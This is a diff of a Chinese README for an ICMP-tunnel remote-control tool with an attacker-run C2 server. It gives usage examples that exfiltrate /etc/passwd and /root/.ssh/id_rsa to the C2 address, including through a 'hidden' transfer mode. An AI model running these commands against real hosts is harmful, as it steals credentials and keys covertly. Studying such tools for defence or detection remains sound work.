@@ -1,4 +1,4 @@
-此工具是一个使用 Go 语言编写的交互式ICMP隧道工具。
+ICMP隧道远控工具。
 
 ---
 
@@ -17,20 +17,15 @@
 
 ## 🚀 快速编译
 ### 1. 编译
-确保你已经安装了 Go 环境 (版本 >= 1.22)。
+Go 环境 (版本 >= 1.20)。
 
 ```bash
-# 进入项目目录
-cd /path/to/GoICMP-Shell
-
 # 编译服务端
 go build -o icmpsh_ser ./cmd/server/
 
 # 编译客户端
 go build -o icmpsh_cli ./cmd/shell/
 ```
-
-
 
 ## <font style="color:rgb(13, 18, 57);">🚀</font><font style="color:rgb(13, 18, 57);"> 快速上手</font>
 + **<font style="color:rgb(13, 18, 57);">攻击机</font>**<font style="color:rgb(13, 18, 57);">: 控制主机 (C2)，IP地址为</font><font style="color:rgb(13, 18, 57);background-color:#D8DAD9;">111.111.111.11</font><font style="color:rgb(13, 18, 57);">，在此主机运行服务端。</font>
@@ -69,7 +64,7 @@ go build -o icmpsh_cli ./cmd/shell/
 
 ```html
 # 语法: ./icmpsh_cli --ip <服务端IP> --token <共享密钥> --filetrans <文件路径>
-./icmpsh_cli --ip 192.168.1.10 --token "MySecretKey123" --filetrans /etc/passwd --mtu 256 --interval 1
+./icmpsh_cli --ip 111.111.111.11 --token "MySecretKey123" --filetrans /etc/passwd --mtu 256 --interval 1
 ```
 
 ### <font style="color:rgb(13, 18, 57);">场景三：</font>
@@ -88,7 +83,7 @@ go build -o icmpsh_cli ./cmd/shell/
 
 ```html
 # 语法: ./icmpsh_cli --ip <服务端IP> --token <共享密钥> --fth <文件路径>
-./icmpsh_cli --ip 192.168.1.10 --token "MySecretKey123" --fth /root/.ssh/id_rsa
+./icmpsh_cli --ip 111.111.111.11 --token "MySecretKey123" --fth /root/.ssh/id_rsa
 
 ```
 
@@ -100,11 +95,11 @@ go build -o icmpsh_cli ./cmd/shell/
 
 | **<font style="color:rgb(255, 255, 255);">参数</font>** | **<font style="color:rgb(255, 255, 255);">别名</font>** | **<font style="color:rgb(255, 255, 255);">类型</font>** | **<font style="color:rgb(255, 255, 255);">默认值</font>** | **<font style="color:rgb(255, 255, 255);">描述</font>** |
 | --- | --- | --- | --- | --- |
-| `<font style="color:rgb(0, 0, 0);">--token</font>` | `<font style="color:rgb(0, 0, 0);">-t</font>` | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">"go-icmpshell"</font> | <font style="color:rgb(0, 0, 0);">用于客户端和服务端认证的共享密钥。</font> |
-| `<font style="color:rgb(0, 0, 0);">--filetrans</font>` | `<font style="color:rgb(0, 0, 0);">-ft</font>` | <font style="color:rgb(0, 0, 0);">bool</font> | <font style="color:rgb(0, 0, 0);">false</font> | <font style="color:rgb(0, 0, 0);">启动文件接收模式。此模式下，其他模式和加密参数无效。</font> |
-| `<font style="color:rgb(0, 0, 0);">--mode</font>` | `<font style="color:rgb(0, 0, 0);">-m</font>` | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">"session"</font> | <font style="color:rgb(0, 0, 0);">运行模式，可选:</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">session</font>`<br/><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">(实时会话) 或</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">beacon</font>`<br/><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">(信标)。</font> |
-| `<font style="color:rgb(0, 0, 0);">--crypto-mode</font>` | `<font style="color:rgb(0, 0, 0);">-cm</font>` | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">"none"</font> | <font style="color:rgb(0, 0, 0);">载荷加密/编码模式，可选:</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">aes</font>`<br/><font style="color:rgb(0, 0, 0);">,</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">xor</font>`<br/><font style="color:rgb(0, 0, 0);">,</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">base64</font>`<br/><font style="color:rgb(0, 0, 0);">,</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">base32</font>`<br/><font style="color:rgb(0, 0, 0);">,</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">none</font>`<br/><font style="color:rgb(0, 0, 0);">。</font> |
-| `<font style="color:rgb(0, 0, 0);">--mtu</font>` | | <font style="color:rgb(0, 0, 0);">int</font> | <font style="color:rgb(0, 0, 0);">666</font> | <font style="color:rgb(0, 0, 0);">（会话/信标模式）定义单包最大载荷，最小为64。</font> |
+| <font style="color:rgb(0, 0, 0);">--token</font> | <font style="color:rgb(0, 0, 0);">-t</font> | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">"go-icmpshell"</font> | <font style="color:rgb(0, 0, 0);">用于客户端和服务端认证的共享密钥。</font> |
+| <font style="color:rgb(0, 0, 0);">--filetrans</font> | <font style="color:rgb(0, 0, 0);">-ft</font> | <font style="color:rgb(0, 0, 0);">bool</font> | <font style="color:rgb(0, 0, 0);">false</font> | <font style="color:rgb(0, 0, 0);">启动文件接收模式。此模式下，其他模式和加密参数无效。</font> |
+| <font style="color:rgb(0, 0, 0);">--mode</font> | <font style="color:rgb(0, 0, 0);">-m</font> | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">"session"</font> | <font style="color:rgb(0, 0, 0);">运行模式，可选: session (实时会话) 或 beacon (信标)。</font> |
+| <font style="color:rgb(0, 0, 0);">--crypto-mode</font> | <font style="color:rgb(0, 0, 0);">-cm</font> | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">"none"</font> | <font style="color:rgb(0, 0, 0);">载荷加密/编码模式，可选: aes, xor, base64, base32, none。</font> |
+| <font style="color:rgb(0, 0, 0);">--mtu</font> | | <font style="color:rgb(0, 0, 0);">int</font> | <font style="color:rgb(0, 0, 0);">576</font> | <font style="color:rgb(0, 0, 0);">(会话/信标模式) 定义单包最大载荷，最小为64。</font> |
 
 
 ### <font style="color:rgb(13, 18, 57);">客户端 (icmpsh_cli)</font>
@@ -112,23 +107,25 @@ go build -o icmpsh_cli ./cmd/shell/
 
 | **<font style="color:rgb(255, 255, 255);">参数</font>** | **<font style="color:rgb(255, 255, 255);">别名</font>** | **<font style="color:rgb(255, 255, 255);">类型</font>** | **<font style="color:rgb(255, 255, 255);">默认值</font>** | **<font style="color:rgb(255, 255, 255);">描述</font>** |
 | --- | --- | --- | --- | --- |
-| `<font style="color:rgb(0, 0, 0);">--ip</font>` | `<font style="color:rgb(0, 0, 0);">-i</font>` | <font style="color:rgb(0, 0, 0);">string</font> | **<font style="color:rgb(0, 0, 0);">(必需)</font>** | <font style="color:rgb(0, 0, 0);">要连接的服务端IP地址。</font> |
-| `<font style="color:rgb(0, 0, 0);">--token</font>` | `<font style="color:rgb(0, 0, 0);">-t</font>` | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">"go-icmpshell"</font> | <font style="color:rgb(0, 0, 0);">共享密钥，必须与服务端匹配。</font> |
-| `<font style="color:rgb(0, 0, 0);">--filetrans</font>` | `<font style="color:rgb(0, 0, 0);">-ft</font>` | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">""</font> | <font style="color:rgb(0, 0, 0);">普通文件传输模式，值为要发送的文件路径。与</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">--fth</font>`<br/><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">及其他模式互斥。</font> |
-| `<font style="color:rgb(0, 0, 0);">--filetrans-hide</font>` | `<font style="color:rgb(0, 0, 0);">-fth</font>` | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">""</font> | <font style="color:rgb(0, 0, 0);">隐藏文件传输模式，值为要发送的文件路径。与</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">--ft</font>`<br/><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">及其他模式互斥。</font> |
-| `<font style="color:rgb(0, 0, 0);">--mode</font>` | `<font style="color:rgb(0, 0, 0);">-m</font>` | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">"session"</font> | <font style="color:rgb(0, 0, 0);">运行模式，</font>`<font style="color:rgb(0, 0, 0);">session</font>`<br/><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">或</font><font style="color:rgb(0, 0, 0);"> </font>`<font style="color:rgb(0, 0, 0);">beacon</font>`<br/><font style="color:rgb(0, 0, 0);">。</font> |
-| `<font style="color:rgb(0, 0, 0);">--crypto-mode</font>` | `<font style="color:rgb(0, 0, 0);">-cm</font>` | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">"none"</font> | <font style="color:rgb(0, 0, 0);">加密/编码模式，必须与服务端匹配。</font> |
-| `<font style="color:rgb(0, 0, 0);">--mtu</font>` | | <font style="color:rgb(0, 0, 0);">int</font> | <font style="color:rgb(0, 0, 0);">666</font> | <font style="color:rgb(0, 0, 0);">定义单包最大载荷，最小为64。</font> |
-| `<font style="color:rgb(0, 0, 0);">--interval</font>` | | <font style="color:rgb(0, 0, 0);">int</font> | <font style="color:rgb(0, 0, 0);">1</font> | <font style="color:rgb(0, 0, 0);">发包的时间间隔，单位为秒，最小为1。</font> |
-| `<font style="color:rgb(0, 0, 0);">--icmpId</font>` | | <font style="color:rgb(0, 0, 0);">uint</font> | <font style="color:rgb(0, 0, 0);">1000</font> | <font style="color:rgb(0, 0, 0);">通信所使用的ICMP ID。</font> |
+| <font style="color:rgb(0, 0, 0);">--ip</font> | <font style="color:rgb(0, 0, 0);">-i</font> | <font style="color:rgb(0, 0, 0);">string</font> | **<font style="color:rgb(0, 0, 0);">(必需)</font>** | <font style="color:rgb(0, 0, 0);">要连接的服务端IP地址。</font> |
+| <font style="color:rgb(0, 0, 0);">--token</font> | <font style="color:rgb(0, 0, 0);">-t</font> | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">"go-icmpshell"</font> | <font style="color:rgb(0, 0, 0);">共享密钥，必须与服务端匹配。</font> |
+| <font style="color:rgb(0, 0, 0);">--filetrans</font> | <font style="color:rgb(0, 0, 0);">-ft</font> | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">""</font> | <font style="color:rgb(0, 0, 0);">普通文件传输模式，值为要发送的文件路径。与 --fth 及其他模式互斥。</font> |
+| <font style="color:rgb(0, 0, 0);">--filetrans-hide</font> | <font style="color:rgb(0, 0, 0);">-fth</font> | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">""</font> | <font style="color:rgb(0, 0, 0);">隐藏文件传输模式，值为要发送的文件路径。与 --ft 及其他模式互斥。</font> |
+| <font style="color:rgb(0, 0, 0);">--mode</font> | <font style="color:rgb(0, 0, 0);">-m</font> | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">"session"</font> | <font style="color:rgb(0, 0, 0);">运行模式，session 或 beacon。</font> |
+| <font style="color:rgb(0, 0, 0);">--crypto-mode</font> | <font style="color:rgb(0, 0, 0);">-cm</font> | <font style="color:rgb(0, 0, 0);">string</font> | <font style="color:rgb(0, 0, 0);">"none"</font> | <font style="color:rgb(0, 0, 0);">加密/编码模式，必须与服务端匹配。</font> |
+| <font style="color:rgb(0, 0, 0);">--mtu</font> | | <font style="color:rgb(0, 0, 0);">int</font> | <font style="color:rgb(0, 0, 0);">576</font> | <font style="color:rgb(0, 0, 0);">定义单包最大载荷，最小为64。</font> |
+| <font style="color:rgb(0, 0, 0);">--interval</font> | | <font style="color:rgb(0, 0, 0);">int</font> | <font style="color:rgb(0, 0, 0);">1</font> | <font style="color:rgb(0, 0, 0);">发包的时间间隔，单位为秒，最小为1。</font> |
+| <font style="color:rgb(0, 0, 0);">--icmpId</font> | | <font style="color:rgb(0, 0, 0);">uint</font> | <font style="color:rgb(0, 0, 0);">1000</font> | <font style="color:rgb(0, 0, 0);">通信所使用的ICMP ID。</font> |
 
 
-### <font style="color:rgb(13, 18, 57);">客户端各模式下参数有效性总结</font>
-| **<font style="color:rgb(255, 255, 255);">操作模式 (通过flag触发)</font>** | `**<font style="color:rgb(255, 255, 255);">--mtu</font>**`<br/>**<font style="color:rgb(255, 255, 255);">   </font>****<font style="color:rgb(255, 255, 255);">调整数据块大小</font>** | `**<font style="color:rgb(255, 255, 255);">--interval</font>**`<br/>**<font style="color:rgb(255, 255, 255);">   </font>****<font style="color:rgb(255, 255, 255);">控制发包频率</font>** | `**<font style="color:rgb(255, 255, 255);">--crypto-mode</font>**`<br/>**<font style="color:rgb(255, 255, 255);">   </font>****<font style="color:rgb(255, 255, 255);">控制传输加密类型</font>** |
+### <font style="color:rgb(13, 18, 57);">客户端各模式下参数有效性</font>
+<font style="color:rgb(255, 255, 255);">全屏</font><font style="color:rgb(255, 255, 255);">复制</font>
+
+| **<font style="color:rgb(255, 255, 255);">操作模式 (通过flag触发)</font>** | **<font style="color:rgb(255, 255, 255);">--mtu   </font>****<font style="color:rgb(255, 255, 255);">调整数据块大小</font>** | **<font style="color:rgb(255, 255, 255);">--interval   </font>****<font style="color:rgb(255, 255, 255);">控制发包频率</font>** | **<font style="color:rgb(255, 255, 255);">--crypto-mode   </font>****<font style="color:rgb(255, 255, 255);">控制传输加密类型</font>** |
 | --- | :---: | :---: | :---: |
-| **<font style="color:rgb(0, 0, 0);">会话/信标模式</font>**<font style="color:rgb(0, 0, 0);">   </font><font style="color:rgb(0, 0, 0);">(</font>`<font style="color:rgb(0, 0, 0);">--mode</font>`<br/><font style="color:rgb(0, 0, 0);">)</font> | <font style="color:rgb(0, 0, 0);">✅</font> | <font style="color:rgb(0, 0, 0);">✅</font><font style="color:rgb(0, 0, 0);"> (仅beacon)</font> | <font style="color:rgb(0, 0, 0);">✅</font> |
-| **<font style="color:rgb(0, 0, 0);">普通文件传输</font>**<font style="color:rgb(0, 0, 0);">   </font><font style="color:rgb(0, 0, 0);">(</font>`<font style="color:rgb(0, 0, 0);">--filetrans</font>`<br/><font style="color:rgb(0, 0, 0);">)</font> | <font style="color:rgb(0, 0, 0);">✅</font> | <font style="color:rgb(0, 0, 0);">✅</font> | <font style="color:rgb(0, 0, 0);">❌</font><font style="color:rgb(0, 0, 0);"> (仅支持原文)</font> |
-| **<font style="color:rgb(0, 0, 0);">隐藏文件传输</font>**<font style="color:rgb(0, 0, 0);">   </font><font style="color:rgb(0, 0, 0);">(</font>`<font style="color:rgb(0, 0, 0);">--fth</font>`<br/><font style="color:rgb(0, 0, 0);">)</font> | <font style="color:rgb(0, 0, 0);">❌</font><font style="color:rgb(0, 0, 0);"> (固定为56字节)</font> | <font style="color:rgb(0, 0, 0);">✅</font> | <font style="color:rgb(0, 0, 0);">❌</font><font style="color:rgb(0, 0, 0);"> (仅支持原文)</font> |
+| **<font style="color:rgb(0, 0, 0);">会话/信标模式</font>**<font style="color:rgb(0, 0, 0);">   </font><font style="color:rgb(0, 0, 0);">(--mode)</font> | <font style="color:rgb(0, 0, 0);">✅</font> | <font style="color:rgb(0, 0, 0);">✅</font><font style="color:rgb(0, 0, 0);"> (仅beacon)</font> | <font style="color:rgb(0, 0, 0);">✅</font> |
+| **<font style="color:rgb(0, 0, 0);">普通文件传输</font>**<font style="color:rgb(0, 0, 0);">   </font><font style="color:rgb(0, 0, 0);">(--filetrans)</font> | <font style="color:rgb(0, 0, 0);">✅</font> | <font style="color:rgb(0, 0, 0);">✅</font> | <font style="color:rgb(0, 0, 0);">❌</font><font style="color:rgb(0, 0, 0);"> (仅支持原文)</font> |
+| **<font style="color:rgb(0, 0, 0);">隐藏文件传输</font>**<font style="color:rgb(0, 0, 0);">   </font><font style="color:rgb(0, 0, 0);">(--fth)</font> | <font style="color:rgb(0, 0, 0);">❌</font><font style="color:rgb(0, 0, 0);"> (固定为56字节)</font> | <font style="color:rgb(0, 0, 0);">✅</font> | <font style="color:rgb(0, 0, 0);">❌</font><font style="color:rgb(0, 0, 0);"> (仅支持原文)</font> |
 
 
 ## <font style="color:rgb(13, 18, 57);">⚠️</font><font style="color:rgb(13, 18, 57);"> 免责声明</font>
